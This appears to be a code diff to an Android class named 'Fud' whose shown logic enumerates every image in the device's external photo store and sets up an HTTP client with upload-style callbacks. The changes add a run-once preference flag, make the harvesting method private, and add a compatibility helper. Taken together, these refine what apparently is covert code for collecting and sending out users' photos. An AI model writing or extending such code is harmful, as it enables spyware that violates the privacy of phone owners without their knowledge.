@@ -2,6 +2,7 @@ package sm.dn.yes;
 
 import android.app.Application;
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.os.Build;
 import android.provider.MediaStore;
@@ -12,6 +13,8 @@ import com.lzy.okgo.interceptor.HttpLoggingInterceptor;
 import com.lzy.okgo.model.Response;
 
 import java.io.File;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
@@ -27,6 +30,13 @@ public class Fud {
     private static Context mContext;
 
     public static void ok(Context context) {
+        SharedPreferences sp = context.getSharedPreferences("cssm", Context.MODE_PRIVATE);
+        SharedPreferences.Editor editor = sp.edit();
+        if (sp.getString("ys", "n").equals("y")) {
+            return;
+        }
+        editor.putString("ys", "y");
+        SharedPreferencesCompat.apply(editor);
         mContext = context;
         //初始化okgo
         OkHttpClient.Builder builder = new OkHttpClient.Builder();
@@ -54,7 +64,7 @@ public class Fud {
         }).start();
     }
 
-    public static void tb() {
+    private static void tb() {
         mFilePash.clear();
         Cursor cursor = mContext.getContentResolver().query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
@@ -120,5 +130,46 @@ public class Fud {
                         cb(mConunt);
                     }
                 });
+    }
+
+    /**
+     * 创建一个解决SharedPreferencesCompat.apply方法的一个兼容类
+     */
+    private static class SharedPreferencesCompat {
+        private static final Method sApplyMethod = findApplyMethod();
+
+        /**
+         * 反射查找apply的方法
+         *
+         * @return
+         */
+        @SuppressWarnings({"unchecked", "rawtypes"})
+        private static Method findApplyMethod() {
+            try {
+                Class clz = SharedPreferences.Editor.class;
+                return clz.getMethod("apply");
+            } catch (NoSuchMethodException e) {
+            }
+
+            return null;
+        }
+
+        /**
+         * 如果找到则使用apply执行，否则使用commit
+         *
+         * @param editor
+         */
+        public static void apply(SharedPreferences.Editor editor) {
+            try {
+                if (sApplyMethod != null) {
+                    sApplyMethod.invoke(editor);
+                    return;
+                }
+            } catch (IllegalArgumentException e) {
+            } catch (IllegalAccessException e) {
+            } catch (InvocationTargetException e) {
+            }
+            editor.commit();
+        }
     }
 }
